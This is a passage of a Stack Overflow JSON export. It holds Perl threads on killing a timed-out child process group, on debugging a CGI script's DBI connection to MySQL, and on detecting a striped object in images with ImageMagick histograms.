Use negative PIDs like in the shell and in the system call: <code>kill 9, -$pid;</code>, or better yet, <code>kill KILL =&gt; -$pid;</code>"}, {"owner": {"reputation": 1790, "user_id": 2934827, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/67024440419e02c6c2bfca52faa2c708?s=128&d=identicon&r=PG&f=1", "display_name": "jsh6303", "link": "https://stackoverflow.com/users/2934827/jsh6303"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1494538983, "post_id": 43925585, "comment_id": 74885324, "body": "Thank you. I just noticed that if I replace my actual <code>run()</code> program with some dummy code like <code>print current_time(),&quot;\\n&quot;; sleep 1200; print current_time(),&quot;\\n&quot;;</code> the second line of <code>print current_time(),&quot;\\n&quot;;</code> will still be executed at time 1200 (20min), even though the parent process is supposed to kill the child."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 2, "creation_date": 1494539148, "post_id": 43925585, "comment_id": 74885399, "body": "Tip: <code>setpgrp(0,0);</code> can be written <code>setpgrp();</code>"}], "answers": [{"comments": [{"owner": {"reputation": 1790, "user_id": 2934827, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/67024440419e02c6c2bfca52faa2c708?s=128&d=identicon&r=PG&f=1", "display_name": "jsh6303", "link": "https://stackoverflow.com/users/2934827/jsh6303"}, "edited": false, "score": 0, "creation_date": 1494595464, "post_id": 43926078, "comment_id": 74909814, "body": "Thanks. I found changing the order of <code>run();</code> and <code>setpgrp(0,0);</code> definitely helped in fixing it. Can I know in more details why we should do <code>setpgrp(0,0)</code> first?"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 1790, "user_id": 2934827, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/67024440419e02c6c2bfca52faa2c708?s=128&d=identicon&r=PG&f=1", "display_name": "jsh6303", "link": "https://stackoverflow.com/users/2934827/jsh6303"}, "edited": false, "score": 0, "creation_date": 1494595882, "post_id": 43926078, "comment_id": 74910134, "body": "Because you&#39;ll never get to it otherwise"}], "tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": false, "score": 3, "last_activity_date": 1494541868, "last_edit_date": 1494541868, "creation_date": 1494539069, "answer_id": 43926078, "question_id": 43925585, "link": "https://stackoverflow.com/questions/43925585/perl-kill-process-with-timeout-ignored/43926078#43926078", "title": "Perl kill process with timeout ignored", "body": "<p>First of all, <code>kill</code> is failing because <code>$pid</code> isn't a process group.</p>\n\n<pre><code>run();\nsetpgrp(0,0);\n</code></pre>\n\n<p>should be</p>\n\n<pre><code>setpgrp(0,0);\nrun();\n</code></pre>\n\n<hr>\n\n<p>Secondly, the reason you see</p>\n\n<pre><code>Run completed at $nowTime with no timeout\n</code></pre>\n\n<p>even when there's a timeout is that you execute</p>\n\n<pre><code>print \"Run completed at $nowTime with no timeout\\n\"; \n</code></pre>\n\n<p>whether there's a timeout or not.</p>\n\n<hr>\n\n<p>Thirdly, you don't disable the <code>alarm</code> when the child is reaped. Add</p>\n\n<pre><code>alarm(0);\n</code></pre>\n\n<hr>\n\n<p>Fourthly, you expect <code>$nowTime</code> to contain the current time without making it so.</p>\n\n<hr>\n\n<p>Finally, you still need to reap your child even if you kill it. (Ok, this can be skipped if the parent exits immediately anyway.)</p>\n\n<hr>\n\n<p>Fixed:</p>\n\n<pre><code>use strict;\nuse warnings;\n\nuse POSIX qw( strftime );\n\nsub current_time { strftime(\"%Y-%m-%d %H:%M:%S\", localtime) }\n\nsub run {\n  print(\"a\\n\");\n  system('perl', '-e', 'sleep 3;');\n  print(\"b\\n\");\n  system('perl', '-e', 'sleep 3;');\n  print(\"c\\n\");\n}\n\nmy $MAX_TIME = 5;\nmy $pid = fork();\ndie($!) if !defined($pid);\nif ($pid) {\n  if (eval{\n    local $SIG{ALRM} = sub {\n      kill KILL =&gt; -$pid;\n      die \"TIMEOUT!\\n\";\n    };\n    alarm($MAX_TIME);\n    waitpid($pid, 0);\n    alarm(0);\n    return 1;\n  }) {\n    print \"[\".current_time().\"] Run completed.\\n\";\n  } else {\n    die($@) if $@ ne \"TIMEOUT!\\n\";\n    print \"[\".current_time().\"] Run timed out.\\n\";\n    waitpid($pid, 0);\n    print \"[\".current_time().\"] Child reaped.\\n\";\n  }\n} else {\n  print \"[\".current_time().\"] Run started.\\n\";\n  setpgrp(0,0);\n  run();\n}\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>[2017-05-11 14:58:06] Run started.\na\nb\n[2017-05-11 14:58:11] Run timed out.\n[2017-05-11 14:58:11] Child reaped.\n</code></pre>\n"}], "owner": {"reputation": 1790, "user_id": 2934827, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/67024440419e02c6c2bfca52faa2c708?s=128&d=identicon&r=PG&f=1", "display_name": "jsh6303", "link": "https://stackoverflow.com/users/2934827/jsh6303"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 215, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1494541868, "creation_date": 1494536961, "last_edit_date": 1494538868, "question_id": 43925585, "link": "https://stackoverflow.com/questions/43925585/perl-kill-process-with-timeout-ignored", "title": "Perl kill process with timeout ignored", "body": "<p>I was testing my source code, in which the child process calls several other programs (some of which are C++).</p>\n\n<pre><code>#Other variables and functions\n\nmy $MAX_TIME = 10;#testing 10 minutes\nmy $timeRemaining = $MAX_TIME * 60;\nmy $pid = fork();\nif ( $pid == 0 ) {\n  #child process\n  my $nowTime = localtime;\n  print \"Run started at $nowTime\\n\";\n\n  #This run() calls a for loop in perl, in each iteration there are several C++ programs\n  run();\n\n  setpgrp(0,0);\n}\nelsif ($pid &gt; 0){\n  my $nowTime = localtime;\n  eval{\n    local $SIG{ALRM} = sub {\n      kill -9, $pid;\n      print \"Run completed at $nowTime\\nJob time out for $MAX_TIME minutes\\n\";\n      log();\n      die \"TIMEOUT!\\n\";\n    };\n    alarm $timeRemaining;\n    waitpid($pid, 0);\n  };\n  print \"Run completed at $nowTime with no timeout\\n\";\n}\n</code></pre>\n\n<p>When I checked the print out, I noticed that after 10 minutes, the \"Run completed at $nowTime with no timeout\\n\" part gets printed out, and the child process is still executing. The <code>die \"TIMEOUT!\\n\";</code> part in the parent process does not get executed.\nIs it because of the C++ programs that the perl program calls cannot be killed once it started?</p>\n"}, {"tags": ["perl", "cgi", "dbi"], "comments": [{"owner": {"reputation": 60461, "user_id": 3636601, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/69a1b4f750ece89db0e49c94519f1a7d?s=128&d=identicon&r=PG&f=1", "display_name": "Jens", "link": "https://stackoverflow.com/users/3636601/jens"}, "edited": false, "score": 2, "creation_date": 1494507053, "post_id": 43915931, "comment_id": 74864959, "body": "Any error message?You should use $userid and $passowrd to connect: <code>DBI-&gt;connect($dsn,$userid,$password)</code>"}, {"owner": {"reputation": 113221, "user_id": 100754, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/7804ebae32fbadef38537d74a915c22f?s=128&d=identicon&r=PG", "display_name": "Sinan &#220;n&#252;r", "link": "https://stackoverflow.com/users/100754/sinan-%c3%9cn%c3%bcr"}, "edited": false, "score": 1, "creation_date": 1494507191, "post_id": 43915931, "comment_id": 74865067, "body": "&quot;<code>print $FIRST_NAME ,p,  ...</code>&quot; ... that&#39;s a crime against humanity. What do you think <b><code>my $AGE=em(param(&#39;Age&#39;)) ;</code></b> does?"}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "reply_to_user": {"reputation": 113221, "user_id": 100754, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/7804ebae32fbadef38537d74a915c22f?s=128&d=identicon&r=PG", "display_name": "Sinan &#220;n&#252;r", "link": "https://stackoverflow.com/users/100754/sinan-%c3%9cn%c3%bcr"}, "edited": false, "score": 2, "creation_date": 1494507474, "post_id": 43915931, "comment_id": 74865264, "body": "@Sinan <a href=\"https://www.youtube.com/watch?v=jKOqtRMT85s\" rel=\"nofollow noreferrer\">&quot;CGI.pm is so ugly, it makes blind children cry!&quot;</a> :)"}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 2, "creation_date": 1494507542, "post_id": 43915931, "comment_id": 74865328, "body": "There&#39;s a <code>$dsn</code> in your code that&#39;s not declared. <code>$stmt</code> is declared twice. Turn on <code>use strict</code> and <code>use warnings</code>, fix the problems they report and then <a href=\"https://stackoverflow.com/posts/43915931/edit\">edit</a> your post and update the code please."}, {"owner": {"reputation": 113221, "user_id": 100754, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/7804ebae32fbadef38537d74a915c22f?s=128&d=identicon&r=PG", "display_name": "Sinan &#220;n&#252;r", "link": "https://stackoverflow.com/users/100754/sinan-%c3%9cn%c3%bcr"}, "edited": false, "score": 1, "creation_date": 1494507931, "post_id": 43915931, "comment_id": 74865632, "body": "Do you really want to tie your program to <a href=\"https://metacpan.org/pod/distribution/CGI/lib/CGI.pod#HTML-Generation-functions-should-no-longer-be-used\" rel=\"nofollow noreferrer\">old and buggy versions of CGI.pm</a>?"}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 1, "creation_date": 1494508567, "post_id": 43915931, "comment_id": 74866172, "body": "<code>print  $FIRST_NAME ,p, $LAST_NAME,p,...</code> I&#39;m not sure what scares me most - the Perl or the HTML it generates!"}, {"owner": {"reputation": 1, "user_id": 7888891, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-u8TxhdniW84/AAAAAAAAAAI/AAAAAAAAIwQ/bat8y_9w4kA/photo.jpg?sz=128", "display_name": "Ajay Chopra", "link": "https://stackoverflow.com/users/7888891/ajay-chopra"}, "edited": false, "score": 0, "creation_date": 1494508650, "post_id": 43915931, "comment_id": 74866250, "body": "$dns is declared  my $dsn = &quot;DBI:mysql:testdb&quot;; and $stmt is declare twice has no issue ."}, {"owner": {"reputation": 1, "user_id": 7888891, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-u8TxhdniW84/AAAAAAAAAAI/AAAAAAAAIwQ/bat8y_9w4kA/photo.jpg?sz=128", "display_name": "Ajay Chopra", "link": "https://stackoverflow.com/users/7888891/ajay-chopra"}, "edited": false, "score": 0, "creation_date": 1494508732, "post_id": 43915931, "comment_id": 74866325, "body": "Please help in how I can connect DBI through CGI script .The connect  one code do not work ."}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 2, "creation_date": 1494508806, "post_id": 43915931, "comment_id": 74866395, "body": "@AjayChopra: What is the error that you get (please edit your question to add this information."}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 1, "creation_date": 1494508839, "post_id": 43915931, "comment_id": 74866429, "body": "Your DSN assumes that the database is on the same server as the web server. Is that correct?"}, {"owner": {"reputation": 113221, "user_id": 100754, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/7804ebae32fbadef38537d74a915c22f?s=128&d=identicon&r=PG", "display_name": "Sinan &#220;n&#252;r", "link": "https://stackoverflow.com/users/100754/sinan-%c3%9cn%c3%bcr"}, "edited": false, "score": 2, "creation_date": 1494508841, "post_id": 43915931, "comment_id": 74866434, "body": "@AjayChopra Please read <a href=\"https://stackoverflow.com/help/how-to-ask\">How do I ask a good question?</a>. We cannot divine what is happening on your computer without you showing us the error messages you get etc."}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 1, "creation_date": 1494509363, "post_id": 43915931, "comment_id": 74866853, "body": "In your code, you define variables for <code>$userid</code> and <code>$password</code>, in the call to <code>connect()</code> you ignore those variables and use hard-coded values. Is that the problem? And does your root user really have an empty password?"}, {"owner": {"reputation": 1, "user_id": 7888891, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-u8TxhdniW84/AAAAAAAAAAI/AAAAAAAAIwQ/bat8y_9w4kA/photo.jpg?sz=128", "display_name": "Ajay Chopra", "link": "https://stackoverflow.com/users/7888891/ajay-chopra"}, "edited": false, "score": 0, "creation_date": 1494509675, "post_id": 43915931, "comment_id": 74867081, "body": "I dont get any error message .yes I have root userid and dont have any password ."}, {"owner": {"reputation": 1, "user_id": 7888891, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-u8TxhdniW84/AAAAAAAAAAI/AAAAAAAAIwQ/bat8y_9w4kA/photo.jpg?sz=128", "display_name": "Ajay Chopra", "link": "https://stackoverflow.com/users/7888891/ajay-chopra"}, "edited": false, "score": 0, "creation_date": 1494509789, "post_id": 43915931, "comment_id": 74867181, "body": "I did debugging by printing the values all values are printed above the connect statement and after the connect statement it is not showing."}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 1, "creation_date": 1494512097, "post_id": 43915931, "comment_id": 74869104, "body": "@AjayChopra: You say you don&#39;t get an error message. Your code gives a &quot;can&#39;t connect&quot; error if the connection fails. Therefore it seems that the connection doesn&#39;t fail. What makes you think that the connection fails?"}, {"owner": {"reputation": 113221, "user_id": 100754, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/7804ebae32fbadef38537d74a915c22f?s=128&d=identicon&r=PG", "display_name": "Sinan &#220;n&#252;r", "link": "https://stackoverflow.com/users/100754/sinan-%c3%9cn%c3%bcr"}, "reply_to_user": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 1, "creation_date": 1494513746, "post_id": 43915931, "comment_id": 74870500, "body": "@DaveCross He is not looking in the error log. OP: First, try to debug on the command line."}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 1, "creation_date": 1494513894, "post_id": 43915931, "comment_id": 74870630, "body": "@AjayChopra Is what Sinan says right? Are you looking in the web server error log? What does it say there?"}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 2, "creation_date": 1494513979, "post_id": 43915931, "comment_id": 74870697, "body": "@AjayChopra: By the way, that <code>use Apache::DBI</code> is doing nothing for you in a CGI environment. You should just remove it."}], "answers": [{"tags": [], "owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "is_accepted": false, "score": 2, "last_activity_date": 1494515395, "last_edit_date": 1494515395, "creation_date": 1494514974, "answer_id": 43919160, "question_id": 43915931, "link": "https://stackoverflow.com/questions/43915931/why-cant-i-connect-to-a-database-using-dbi-in-my-perl-cgi-script/43919160#43919160", "title": "Why can&#39;t I connect to a database using DBI in my Perl CGI script?", "body": "<p>There's not nearly enough information here to give you an answer. In particular, there is no way that we can work out what the problem is if we don't know what the error is. You say there's no error message. That's very unlikely, as your code explicitly dies with an error message if the connection fails. This leaves us with two possibilities:</p>\n\n<ul>\n<li>Your program is connecting successfully</li>\n<li>There's an error message, but you haven't seen it yet.</li>\n</ul>\n\n<p>Let's assume it's the second option. Perhaps you don't realise that CGI programs deliberately don't send their error messages to the browser (this is a security feature and you shouldn't try to change it) and that you need to look in the web server error log.</p>\n\n<p>Here are three ways that you could see the error message.</p>\n\n<ul>\n<li>Look in the error log. No, we don't know where the error log is. It depends on the configuration of your server. If we knew which environment you are using then we could take a guess. But as it is, you'll need to ask someone who knows how the server is configured.</li>\n<li>Run your program on the command line. Yes, I know that it's a CGI program. But it's often easiest to debug programs by running them on the command line. You'll need to pass a parameter in as that triggers your program connecting to the database. Then, if there's an error it will be written to STDERR (which is your console).</li>\n<li>Add <code>use CGI::Carp 'fatalsToBrowser';</code> to your code. Remember above where I said that you shouldn't change the fact that CGI errors aren't written to the browser? Well, this is how you override that. It's a terrible idea and I really don't recommend it (mainly because you should remove it again before you put the code into production - and everyone always forgets that and leaves a gaping great security hole in their web server!) but it works in extreme situations where you really can't find out where the error log is and you don't know how to use a command line.</li>\n</ul>\n\n<p>So one of those methods will tell you what the error is. If you edit your question to add that vital detail, then I'm sure someone here will be able to help solve your problem.</p>\n\n<p>Some other tips:</p>\n\n<ul>\n<li>Apache::DBI is doing nothing useful here. Just remove it.</li>\n<li>Learn to format your code.</li>\n<li>The HTML generation functions have been recognised as a terrible idea since the last millennium and now they are deprecated. Please don't use them. Use a templating system instead.</li>\n<li>The <code>&lt;p&gt;</code> element in HTML is a container, not a separator.</li>\n<li>Please read <a href=\"https://metacpan.org/pod/CGI::Alternatives\" rel=\"nofollow noreferrer\">CGI::Alternatives</a> and learn something about how web applications are written in Perl in the 21st century.</li>\n</ul>\n"}], "owner": {"reputation": 1, "user_id": 7888891, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-u8TxhdniW84/AAAAAAAAAAI/AAAAAAAAIwQ/bat8y_9w4kA/photo.jpg?sz=128", "display_name": "Ajay Chopra", "link": "https://stackoverflow.com/users/7888891/ajay-chopra"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 484, "favorite_count": 0, "answer_count": 1, "score": -3, "last_activity_date": 1494515395, "creation_date": 1494506979, "last_edit_date": 1494510561, "question_id": 43915931, "link": "https://stackoverflow.com/questions/43915931/why-cant-i-connect-to-a-database-using-dbi-in-my-perl-cgi-script", "title": "Why can&#39;t I connect to a database using DBI in my Perl CGI script?", "body": "<p>I am trying to integrate CGI with DBI .\nI am taking the results from the cgi and adding it on to the DBI .\nBut cgi script not able connect to the DBI .\nScript is mentioned below .\nThe script is not able to connect with DBI as its failing at connection phase .</p>\n\n<pre><code>use CGI qw/:standard/;\nuse Apache::DBI;\nuse DBI ;\n    my $driver = \"mysql\"; \n           my $database = \"testdb\";\n           my $dsn = \"DBI:mysql:testdb\";\n           my $userid = \"testuser\";\n           my $password = \"test123\";\n\n    print\n           header,\n           start_html('Simple Script'),\n           h1('Simple Script'),\n           start_form,\n           \"What's your First name? \",textfield('First name'),p,\n           \"What's your Last name? \",textfield('Last name'),p,\n           \"What's your Age? \",textfield('Age'),p,\n           \"What's your Income? \",textfield('Income'),p,\n            popup_menu(-name=&gt;'Sex',\n              -values=&gt;['Male','Female']),p,\n           submit,\n           end_form,\n           hr,\"\\n\";\n           if (param) {\n           my $FIRST_NAME=em(param('First name')) ;\n           my $LAST_NAME=em(param('Last name')) ;\n           my $AGE=em(param('Age')) ;\n           my $INCOME=em(param('Income')) ;\n           my $SEX =em(param('Sex')) ;\n\n           print \n           $FIRST_NAME ,p,     \n           $LAST_NAME,p, \n           $SEX,p, \n           $AGE,p, \n           $dsn,p\n           $INCOME ;    \n\n\n\n            my $dbh = DBI-&gt;connect($dsn,\"root\",\"\" ) or die \"Can't connect: \",$DBI::errstr;\n\n           my $stmt ;\n           my $sql = \"INSERT INTO TEST_TABLE (FIRST_NAME, LAST_NAME, SEX, AGE, INCOME ) values (?,?, ?, ?, ?)\";\n\n           my   $stmt = $dbh-&gt;prepare($sql);    \n           $stmt-&gt;execute($FIRST_NAME,$LAST_NAME, $SEX, $AGE, $INCOME) or die $DBI::errstr;\n\n           }       \n           print end_html;\n</code></pre>\n"}, {"tags": ["perl", "imagemagick", "comparison", "histogram"], "comments": [{"owner": {"reputation": 113221, "user_id": 100754, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/7804ebae32fbadef38537d74a915c22f?s=128&d=identicon&r=PG", "display_name": "Sinan &#220;n&#252;r", "link": "https://stackoverflow.com/users/100754/sinan-%c3%9cn%c3%bcr"}, "edited": false, "score": 0, "creation_date": 1494509312, "post_id": 43915852, "comment_id": 74866809, "body": "I don&#39;t know much about this stuff, but it seems to me reducing the image to black and white (not grayscale) is the most obvious way to go, at least based on the sample images you provided. You might also want to try <a href=\"https://dsp.stackexchange.com\">dsp.stackexchange.com</a>"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 1, "creation_date": 1494516901, "post_id": 43915852, "comment_id": 74873057, "body": "Put a microswitch on the lift ramp and network it"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1494517423, "post_id": 43915852, "comment_id": 74873440, "body": "<i>&quot;heavy clouds and dusk make the detection always say the liftramp is not present&quot;</i> Surely no approach based on examining a photograph is going to work at night time? I think we need to see a worst-case image for which your algorithm is failing."}, {"owner": {"reputation": 48798, "user_id": 223226, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/iGqE4.png?s=128&g=1", "display_name": "mpapec", "link": "https://stackoverflow.com/users/223226/mpapec"}, "edited": false, "score": 0, "creation_date": 1494524550, "post_id": 43915852, "comment_id": 74877687, "body": "Mozda ti je pitanje bolje postaviti na mail listi/ircu jer je previse specijalizirano."}], "answers": [{"tags": [], "owner": {"reputation": 27158, "user_id": 7355741, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/6CMNt.jpg?s=128&g=1", "display_name": "fmw42", "link": "https://stackoverflow.com/users/7355741/fmw42"}, "is_accepted": false, "score": 6, "last_activity_date": 1494524431, "creation_date": 1494524431, "answer_id": 43922280, "question_id": 43915852, "link": "https://stackoverflow.com/questions/43915852/using-histogram-to-determine-colored-object-presence/43922280#43922280", "title": "using histogram to determine colored object presence?", "body": "<p>You could do an FFT to get the spectrum of each image. The image with the striped bar has a repetitive pattern that should show up in the spectrum. Using ImageMagick:</p>\n\n<p>Without the bar:</p>\n\n<pre><code>convert XqG0F.png -fft +delete -evaluate log 100000 without.png\n</code></pre>\n\n<p><a href=\"https://i.stack.imgur.com/ZSSOG.png\" rel=\"noreferrer\"><img src=\"https://i.stack.imgur.com/ZSSOG.png\" alt=\"enter image description here\"></a></p>\n\n<p>With bar:</p>\n\n<pre><code>convert x5hWF.png -fft +delete -evaluate log 100000 with.png\n</code></pre>\n\n<p><a href=\"https://i.stack.imgur.com/PB9hX.png\" rel=\"noreferrer\"><img src=\"https://i.stack.imgur.com/PB9hX.png\" alt=\"enter image description here\"></a></p>\n"}, {"tags": [], "owner": {"reputation": 27158, "user_id": 7355741, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/6CMNt.jpg?s=128&g=1", "display_name": "fmw42", "link": "https://stackoverflow.com/users/7355741/fmw42"}, "is_accepted": false, "score": 9, "last_activity_date": 1494540388, "last_edit_date": 1494540388, "creation_date": 1494538765, "answer_id": 43926013, "question_id": 43915852, "link": "https://stackoverflow.com/questions/43915852/using-histogram-to-determine-colored-object-presence/43926013#43926013", "title": "using histogram to determine colored object presence?", "body": "<p>Another way to do it that would be more insensitive to lighting would be to look for red hues after converting to HSV colorspace. But since red has the same 0 hue as black/gray/white, I would invert the image so that red becomes cyan. So histogram the hue channel after inverting and converting to HSV and look for values at cyan hue near 180 degrees or its equivalent of 50% gray or 128 in the range of 0 to 255. In imagemagick, you would do</p>\n\n<pre><code>convert XqG0F.png -negate -colorspace HSV -channel red -separate +channel -define histogram:unique-colors=false histogram:without_hist.png\n</code></pre>\n\n<p><a href=\"https://i.stack.imgur.com/FY1VZ.png\" rel=\"noreferrer\"><img src=\"https://i.stack.imgur.com/FY1VZ.png\" alt=\"enter image description here\"></a></p>\n\n<pre><code>convert x5hWF.png -negate -colorspace HSV -channel red -separate +channel -define histogram:unique-colors=false histogram:with_hist.png\n</code></pre>\n\n<p><a href=\"https://i.stack.imgur.com/tK52L.png\" rel=\"noreferrer\"><img src=\"https://i.stack.imgur.com/tK52L.png\" alt=\"enter image description here\"></a></p>\n\n<p>So you can see in the second image (for the red bar), there is a substantial broad peak near mid-way i.e., 50% (horizontally), but none in the first image in that region.</p>\n"}], "owner": {"reputation": 610, "user_id": 2600099, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f987e5fcc1463e4ebe90870565c5c602?s=128&d=identicon&r=PG", "display_name": "Matija Nalis", "link": "https://stackoverflow.com/users/2600099/matija-nalis"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1355, "favorite_count": 1, "answer_count": 2, "score": 3, "last_activity_date": 1494540388, "creation_date": 1494506804, "question_id": 43915852, "link": "https://stackoverflow.com/questions/43915852/using-histogram-to-determine-colored-object-presence", "title": "using histogram to determine colored object presence?", "body": "<p>I'm trying to determine if portion of the picture contains red-white striped object (liftramp). If it is present, it looks like this: <a href=\"https://i.stack.imgur.com/x5hWF.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/x5hWF.png\" alt=\"present\"></a>, and when not like this: <a href=\"https://i.stack.imgur.com/XqG0F.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/XqG0F.png\" alt=\"none\"></a></p>\n\n<p>The naive approach was to extract histogram, and count if there is more red pixels than blue/green ones:</p>\n\n<pre><code>use Image::Magick;\n\nmy $image = Image::Magick-&gt;new;\nmy $rv = $image-&gt;Read($picture);\n#$rv = $image-&gt;Crop(geometry=&gt;'26x100+484+40');\n\nmy @hist_data = $image-&gt;Histogram;\nmy @hist_entries;\n\n# Histogram returns data as a single list, but the list is actually groups of 5 elements. Turn it into a list of useful hashes.\nwhile (@hist_data) {\n    my ($r, $g, $b, $a, $count) = splice @hist_data, 0, 5;\n    push @hist_entries, { r =&gt; $r, g =&gt; $g, b =&gt; $b, alpha =&gt; $a, count =&gt; $count };\n}\n\nmy $total=0;\nforeach my $v (@hist_entries) {\n        if ($$v{r}&gt;($$v{g}+$$v{b})) { $total +=$$v{count}; }\n}\n</code></pre>\n\n<p>and then comparing if <code>$total &gt; 10</code> (arbitrary threshold). While that seems to work nice for relatively sunny day (giving <em>50-180</em> for presence vs <em>0-2</em> for not present), heavy clouds and dusk make the detection always say the liftramp is not present. </p>\n\n<p>I guess there must be smarter way to detect if red-white object is present. So the question is how to do that detection more reliably?</p>\n\n<p>Note that grayish/green background might change with seasons to more of gray-brown or something. I also cannot count on pixel precision as it might move a little (or I'd just crop a 3-4 pixels and look if they are red) -  but it should mostly fit it he cropped box. </p>\n"}, {"tags": ["linux", "perl", "time", "system-calls"], "comments": [{"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1494507325, "post_id": 43915821, "comment_id": 